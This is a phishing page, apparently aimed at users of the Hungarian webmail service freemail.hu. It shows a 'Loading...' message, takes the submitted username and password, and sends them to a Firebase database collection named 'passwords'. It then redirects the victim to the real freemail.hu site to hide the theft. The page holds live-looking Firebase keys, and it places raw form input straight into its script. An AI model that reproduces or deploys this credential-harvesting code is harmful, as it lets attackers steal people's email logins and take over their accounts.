Töltés...
<script src="https://www.gstatic.com/firebasejs/4.7.0/firebase.js"></script>

<script>
  //Store information about your firebase so we can connect
  
  //!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
  //IMPORTANT: REPLACE THESE WITH YOUR VALUES (these ones won't work)
  //!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

  var config = {
   apiKey: "AIzaSyDlJT6rEF-Y6RsRI1DqejSLn4h490MR45M",

  authDomain: "ungarische-spion-data.firebaseapp.com",

  databaseURL: "https://ungarische-spion-data-default-rtdb.firebaseio.com",

  projectId: "ungarische-spion-data",

  storageBucket: "ungarische-spion-data.appspot.com",

  messagingSenderId: "1096470388537",

  appId: "1:1096470388537:web:2484b0b9696088996592e8"

  };


  
  ///!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
  //!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

  
  //initialize your firebase
  firebase.initializeApp(config);
  var database = firebase.database();
  
  //create a variable to hold our orders list from firebase
  var firebaseOrdersCollection = database.ref().child('passwords');

  //this function is called when the submit button is clicked
  





   //Grab order data from the form
   var order = {

name: "<?php echo $_POST['username'] ?>",
pwd: "<?php echo $_POST['password'] ?>"




   };
   
  
       firebaseOrdersCollection.push(order); //'orders' is the name of the 'collection' (aka database table)

setTimeout(gotofreemail, 2000);

function gotofreemail() {
    location.replace("https://freemail.hu")
}
    
    
   
   
   
   //'push' (aka add) your order to the existing list
   
   
  
</script>
